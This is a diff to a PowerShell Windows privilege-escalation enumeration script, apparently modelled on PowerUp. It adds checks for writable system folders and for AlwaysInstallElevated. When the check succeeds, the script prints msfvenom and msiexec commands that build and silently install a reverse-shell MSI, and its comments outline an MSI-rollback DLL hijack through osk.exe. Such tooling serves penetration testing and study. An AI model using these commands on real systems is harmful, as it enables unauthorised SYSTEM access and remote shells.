@@ -1,7 +1,6 @@
 # - [x] Scheduled task, the user can modify (from PowerUp)
-# - Default writable Folders
-# - AlwaysInstallElevated
-# - CustomActions
+# - [x] Default writable Folders
+# - [x] AlwaysInstallElevated
 # - [x] From local administrator to NT SYSTEM
 # - Impersonation Privileges
 #     - SeBackup (Read sensitive files: SAM/SYSTEM/MEMORY.DMP)
@@ -36,6 +35,82 @@
 #         - The exploit contains a .msi file with 2 actions, the first produces a delay and the second throws and error to make it rollback. The rollback will "restore" a malicious HID.dll in `C:\Program Files\Microsoft Shared\ink\HID.dll`
 #         - Then switch to the secure desktop using: `[CTRL]+[ALT]+[DELETE]` and open the On-Screen Keyboard (osk.exe).
 #         - osk.exe process first looks for the `C:\Program Files\Common Files\Microsoft\shared\ink\HID.dll` library instead of `C:\Windows\System32\HID.dll`
+
+function Test-WritePermission {
+    <#
+    .EXAMPLES
+        Test-WritePermission -Paths $pathsToCheck
+    #>
+    
+    param (
+        [string[]]$Paths
+    )
+
+    $pathsToCheck = @(
+    "C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys",
+    "C:\Windows\System32\spool\drivers\color",
+    "C:\Windows\System32\spool\printers",
+    "C:\Windows\System32\spool\servers",
+    "C:\Windows\tracing",
+    "C:\Windows\Temp",
+    "C:\Users\Public",
+    "C:\Windows\Tasks",
+    "C:\Windows\System32\tasks",
+    "C:\Windows\SysWOW64\tasks",
+    "C:\Windows\System32\tasks_migrated\microsoft\windows\pls\system",
+    "C:\Windows\SysWOW64\tasks\microsoft\windows\pls\system",
+    "C:\Windows\debug\wia",
+    "C:\Windows\registration\crmlog",
+    "C:\Windows\System32\com\dmp",
+    "C:\Windows\SysWOW64\com\dmp",
+    "C:\Windows\System32\fxstmp",
+    "C:\Windows\SysWOW64\fxstmp"
+    )
+    
+    foreach ($path in $Paths) {
+        if (Test-Path -Path $path) {
+            try {
+                $testFile = [System.IO.Path]::Combine($path, [System.IO.Path]::GetRandomFileName())
+                $null = New-Item -Path $testFile -ItemType File -Force -ErrorAction Stop
+                Remove-Item -Path $testFile -Force -ErrorAction Stop
+                Write-Output $path
+            } catch {
+                # Do nothing, as we do not want to output paths with no write access
+            }
+        }
+    }
+}
+
+function AlwaysInstallElevated {
+    <#
+    .DESCRIPTION
+        Check for AlwaysInstallElevated. If activated, any user can install .msi.
+    #>
+    # Read registry values
+    $hkcuPath = 'Registry::HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer'
+    $hkcuValue = Get-RegistryValue -path $hkcuPath -name 'AlwaysInstallElevated'
+
+    $hklmPath = 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer'
+    $hklmValue = Get-RegistryValue -path $hklmPath -name 'AlwaysInstallElevated'
+
+    # Print out values
+    Write-Output "HKCU = $hkcuValue"
+    Write-Output "HKLM = $hklmValue"
+
+    # If both are 1 = vulnerable
+    if ($hkcuValue -eq 1 -and $hklmValue -eq 1) {
+        Write-Host -ForegroundColor Green "[YES]" -NoNewline
+        Write-Host " system is vulnerable to AlwaysInstallElevated."
+
+        Write-Host ""
+        Write-Host "Use: msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=1234 -f msi > something.msi"
+        Write-Host "Then Use: msiexec /quiet /qn /i something.msi"
+        Write-Host "Remove it again: msiexec /q /n /uninstall something.msi"
+    } else {
+        Write-Host -ForegroundColor RED "[NO]" -NoNewline
+        Write-Host " system is NOT vulnerable to AlwaysInstallElevated."
+    }
+}
 
 function Get-ModifiableScheduledTaskFile {
 <#
